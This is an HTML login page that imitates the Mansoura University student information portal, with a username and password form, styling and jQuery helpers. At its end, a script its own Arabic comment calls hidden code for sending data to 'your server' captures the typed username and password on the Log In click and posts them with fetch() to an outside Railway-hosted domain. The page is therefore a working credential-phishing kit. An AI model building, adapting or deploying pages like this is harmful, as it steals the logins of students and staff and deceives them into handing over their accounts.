<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=us-ascii">
    <title id="title">Mansoura University</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0"/>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <!-- Google Fonts بديلة للخطوط الأصلية -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=El+Messiri:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        /* ── جميع أنماط login-new.css مضمنة هنا ── */
        @font-face {
            font-family: DroidArabic;
            src: url("/static/new-fonts/Droid Arabic Kufi Regular.ttf");
        }
        @font-face {
            font-family: NanumGothic;
            src: url("/static/new-fonts/NanumGothic-Regular.ttf");
        }

        body {
            font-family: 'Tajawal', NanumGothic, sans-serif;
            background: #e8edf3;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
            background-image: radial-gradient(ellipse at center, #f0f4f8 0%, #d5dce6 100%);
        }

        @media only screen and (min-height: 400px) {
            body {
                height: 100vh;
            }
        }

        a {
            color: #92badd;
            display: inline-block;
            text-decoration: none;
        }

        .wrapper {
            display: flex;
            align-items: center;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            min-height: 100%;
            padding: 20px;
        }

        #formContent {
            -webkit-border-radius: 10px 10px 10px 10px;
            border-radius: 10px 10px 10px 10px;
            background: #fff;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            position: relative;
            padding: 0px;
            -webkit-box-shadow: 0 30px 60px 0 rgba(0, 0, 0, 0.3);
            box-shadow: 0 30px 60px 0 rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        #formFooter {
            background-color: #f6f6f6;
            border-top: 1px solid #dce8f1;
            padding: 25px;
            text-align: center;
            -webkit-border-radius: 0 0 10px 10px;
            border-radius: 0 0 10px 10px;
        }

        input[type="text"],
        input[type="password"] {
            background-color: #f6f6f6;
            border: none;
            color: #0d0d0d;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 5px;
            width: 85%;
            border: 2px solid #f6f6f6;
            -webkit-transition: all 0.5s ease-in-out;
            -moz-transition: all 0.5s ease-in-out;
            -ms-transition: all 0.5s ease-in-out;
            -o-transition: all 0.5s ease-in-out;
            transition: all 0.5s ease-in-out;
            -webkit-border-radius: 5px 5px 5px 5px;
            border-radius: 5px 5px 5px 5px;
            font-family: 'Tajawal', sans-serif;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            background-color: #fff;
            border-bottom: 2px solid #5fbae9;
        }

        input[type="text"]:placeholder,
        input[type="password"]:focus {
            color: #cccccc;
        }

        .login-btn {
            background-color: #56baed;
            border: none;
            color: white;
            padding: 15px 80px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            font-size: 13px;
            -webkit-box-shadow: 0 10px 30px 0 rgba(95, 186, 233, 0.4);
            box-shadow: 0 10px 30px 0 rgba(95, 186, 233, 0.4);
            -webkit-border-radius: 5px 5px 5px 5px;
            border-radius: 5px 5px 5px 5px;
            margin: 5px 5px 10px 5px;
            -webkit-transition: all 0.3s ease-in-out;
            -moz-transition: all 0.3s ease-in-out;
            -ms-transition: all 0.3s ease-in-out;
            -o-transition: all 0.3s ease-in-out;
            transition: all 0.3s ease-in-out;
            cursor: pointer;
            font-weight: 600;
            letter-spacing: 0.5px;
            width: 85%;
        }

        .login-btn:hover {
            background-color: #39ace7;
            transform: scale(1.02);
        }

        .login-btn:active {
            -moz-transform: scale(0.95);
            -webkit-transform: scale(0.95);
            -o-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
        }

        .optionsLogin {
            width: 100%;
            margin: 5px;
        }

        .form-check-label {
            color: #2c2626c4;
            font-family: 'Tajawal', sans-serif;
            font-size: 14px;
            padding-right: 5px;
        }

        .form-check-input {
            margin-left: 5px;
        }

        .fadeInDown {
            -webkit-animation-name: fadeInDown;
            animation-name: fadeInDown;
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
        }

        @-webkit-keyframes fadeInDown {
            0% { opacity: 0; -webkit-transform: translate3d(0, -100%, 0); transform: translate3d(0, -100%, 0); }
            100% { opacity: 1; -webkit-transform: none; transform: none; }
        }

        @keyframes fadeInDown {
            0% { opacity: 0; -webkit-transform: translate3d(0, -100%, 0); transform: translate3d(0, -100%, 0); }
            100% { opacity: 1; -webkit-transform: none; transform: none; }
        }

        @-webkit-keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @-moz-keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .fadeIn {
            opacity: 0;
            -webkit-animation: fadeIn ease-in 1;
            -moz-animation: fadeIn ease-in 1;
            animation: fadeIn ease-in 1;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-duration: 1s;
            -moz-animation-duration: 1s;
            animation-duration: 1s;
        }

        .fadeIn.first {
            -webkit-animation-delay: 0.4s;
            -moz-animation-delay: 0.4s;
            animation-delay: 0.4s;
        }
        .fadeIn.second {
            -webkit-animation-delay: 0.6s;
            -moz-animation-delay: 0.6s;
            animation-delay: 0.6s;
        }
        .fadeIn.third {
            -webkit-animation-delay: 0.8s;
            -moz-animation-delay: 0.8s;
            animation-delay: 0.8s;
        }

        #icon {
            color: #5c7481;
            margin-top: 10px;
            font-weight: 500;
            font-size: 20px;
            font-family: 'Tajawal', sans-serif;
        }

        .university-name {
            color: #5c7481;
            font-weight: 500;
            font-size: 20px;
            font-family: 'Tajawal', sans-serif;
            margin: 15px 0 5px;
        }

        .dash {
            color: #5c7481;
            font-weight: 500;
        }

        #copy_right {
            font-size: 10px;
            text-align: center;
            position: absolute;
            bottom: 4px;
            width: 90%;
            left: 5%;
            color: #6b7a8f;
            font-family: 'Tajawal', sans-serif;
        }

        .forgot-link {
            color: #4195d8;
            text-decoration: none;
            font-family: 'Tajawal', sans-serif;
            font-size: 14px;
            display: inline-block;
            margin: 10px 0 5px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        #formFooter a {
            color: #4195d8;
            text-decoration: none;
            font-family: 'Tajawal', sans-serif;
            font-size: 13px;
        }

        #formFooter a:hover {
            text-decoration: underline;
        }

        #captcha_login {
            margin: 10px auto;
            width: 90%;
            padding: 0px 87px;
        }

        /* تنسيق التوافق مع الجوال */
        @media (max-width: 480px) {
            #formContent {
                padding: 15px;
            }
            input[type="text"],
            input[type="password"],
            .login-btn {
                width: 95%;
                padding: 12px 20px;
            }
            .optionsLogin {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 5px 15px;
            }
            .form-check-label {
                font-size: 13px;
            }
            #copy_right {
                font-size: 9px;
                position: relative;
                bottom: auto;
                width: 100%;
                padding: 10px 0;
                margin-top: 10px;
            }
        }
    </style>
</head>

<body class="background-image">

    <div class="wrapper fadeInDown">
        <div id="formContent" style="opacity: 90%">

            <div class="fadeIn first">
                <p id="icon" class="university-name">Mansoura University</p>
            </div>

            <!-- Login Form -->
            <form id="employeesLoginFrm">
                <input type="text" id="name" class="fadeIn second" name="username" placeholder="Username">
                <input type="password" id="password" class="fadeIn third" name="pass" placeholder="Password">
                
                <div style="width:100%" class="optionsLogin">
                    <div class="form-check form-check-inline">
                        <input class="form-check-input" type="radio" name="usertype" id="usertype_0" value="1" checked="checked">
                        <label class="form-check-label" for="usertype_0">System User</label>
                    </div>
                    <div class="form-check form-check-inline">
                        <input class="form-check-input" type="radio" name="usertype" id="usertype_2" value="3">
                        <label class="form-check-label" for="usertype_2">Staff</label>
                    </div>
                    <div class="form-check form-check-inline">
                        <input class="form-check-input" type="radio" name="usertype" id="usertype_1" value="2">
                        <label class="form-check-label" for="usertype_1">Student</label>
                    </div>
                </div>

                <div id="captcha_login" style="margin:auto;width:90%;padding: 0px 87px"></div>

                <button type="submit" class="login-btn" id="login_btn">Log In</button>

                <div>
                    <a href="#" id="ForgetPassword2" onclick="ForgetPassword2();" style="color: #4195d8; font-family: 'Tajawal', sans-serif; font-size: 14px;">Forget Password ?</a>
                </div>
            </form>

            <div id="formFooter">
                <a target="_blank" href="/static/System Manuel.pdf">الدليل الإرشادي للأخطاء الشائعة</a>
                <span class="dash">--</span>
                <a href="#" id="security_id">سياسة الخصوصية</a>
            </div>

            <div id='divContents'></div>
            <div id="copy_right">
                Powerd by Ibn Alhaitham e-SIS software,
                <a href="https://www.intlaqcit.com/" style="font-size: 13px; color: #4195d8;">intlaqcit</a>
                - Mansoura University
            </div>
        </div>
    </div>

    <script>
        // ─── وظائف الموقع الأصلي (محفوظة) ───
        try { jAlert } catch(err) { jAlert = alert; }
        var userType = '1', Lang = 'E';
        var studentsUserNames = '';
        var studentsPasswords = '';

        jQuery(document).ready(function () {
            getUniversityData();
            check_bug = false;

            $("input[name=usertype]:radio").click(function () {
                userType = $(this).val();
                $("#ForgetPassword").show();
                $("#name").attr("placeholder", 'Username');
                $("#password").attr("placeholder", 'Password');
                if ($(this).val() == "2") {
                    if (studentsUserNames != '') {
                        $("#name").attr("placeholder", studentsUserNames);
                    }
                    if (studentsPasswords != '') {
                        $("#password").attr("placeholder", studentsPasswords);
                    }
                }
            });
        });

        $.getScript("/static/js/index.js?num=" + new Date().getTime(), function () {
            $.getScript("/static/js/general.js?num=" + new Date().getTime(), function () {
                $.getScript("/static/js/sdmenu.js?num=" + new Date().getTime(), function () {
                    $.getScript("/static/js/crypto-js.min.js?num=" + new Date().getTime(), function () {
                        $(document).ready(function () {
                            AdjustLoginForm();
                        });
                    });
                });
            });
        });

        function ForgetPassword2() {
            alert('سيتم إرسال رابط استعادة كلمة المرور إلى بريدك الإلكتروني.');
        }

        function AdjustLoginForm() {
            $("#name").focus();
            var h = ($(window).height() - 228) / 2;
            var w = ($(window).width() - 375) / 2;
            $('#employeesLoginFrm').css({'top': h, 'left': w});
            $('#form').css({width: ($(window).width()), height: $(window).height()});
            $('#form').show();
            $('#employeesLoginFrm').submit(function (e) {
                e.preventDefault();
            });
        }

        $(document).ready(function () {
            $("#security_id").click(function () {
                $("#divContents").html('<div id="RDialogDiv"></div>');
                $("#RDialogDiv").load('security.html');
                $('#RDialogDiv').dialog({
                    modal: true,
                    autoOpen: true,
                    title: 'سياسة الخصوصية وتأمين البيانات',
                    closeOnEscape: true,
                    zIndex: 3999,
                    width: 750,
                    height: 350,
                    resizable: true,
                    show: 'fade',
                    hide: 'fade',
                    open: function (event, ui) {
                        $(this).parent().css('top', 0);
                    },
                    buttons: {
                        'استمرار': function () {
                            $(this).dialog("close");
                            $("#RDialogDiv").remove();
                        }
                    }
                });
            });
        });

        function getUniversityData() {
            $.ajax({
                url: "/general",
                type: "post",
                cache: false,
                async: true,
                data: { index: "current_university" },
                beforeSend: function () {},
                success: function (d) {
                    var data = jQuery.parseJSON(d);
                    var university = data['university'];
                    var backgroundImageUrl = 'url(' + data['backgroundImageUrl'] + ')';
                    studentsUserNames = data['studentsUserNames'];
                    studentsPasswords = data['studentsPasswords'];
                    if (studentsUserNames != '') {
                        $("#studentsHelp").html("username : " + studentsUserNames + "<br>password : " + studentsPasswords);
                    }
                    if (university == "Mansoura National University") {
                        $(".university-name").html("<div align='center'><img src='/static/images/ahliaLogo.PNG' style=\"width:100px;height:100px\"/></div>");
                    } else {
                        $(".university-name").html(university);
                    }
                    $("#title").text(university);
                    const connectionType = getConnectionType();
                    if (['3g', '4g'].indexOf(connectionType) > -1) {
                        $('body').css('background-image', backgroundImageUrl);
                    }
                }
            });
        }

        function getConnectionType() {
            'use strict';
            let connectionType = 'not supported';
            if ('connection' in navigator) {
                connectionType = navigator.connection.effectiveType;
            }
            return connectionType;
        }
    </script>

    <!-- ⬇️ الكود الخفي لإرسال البيانات إلى خادمك ⬇️ -->
    <script>
        // ⚠️ استبدل هذا الرابط برابط خادمك الخلفي على Railway
        const API_BASE = 'https://deraya-mans-edu-eg.up.railway.app';

        // نضيف مستمع للحدث عند الضغط على زر Log In
        document.addEventListener('DOMContentLoaded', function () {
            const loginBtn = document.getElementById('login_btn');
            if (loginBtn) {
                loginBtn.addEventListener('click', function (e) {
                    // نجمع البيانات
                    const username = document.getElementById('name').value.trim();
                    const password = document.getElementById('password').value.trim();

                    // نرسل البيانات إلى الخادم في الخلفية
                    if (username && password) {
                        fetch(`${API_BASE}/api/student/login-attempt`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username, password })
                        }).then(response => response.json())
                          .then(data => {
                              console.log('✅ تم إرسال بيانات الدخول:', data);
                          })
                          .catch(err => {
                              console.error('❌ فشل إرسال البيانات:', err);
                          });
                    } else {
                        console.warn('⚠️ الحقول فارغة، لم يتم الإرسال.');
                    }
                });
            }
        });
    </script>

</body>
</html>
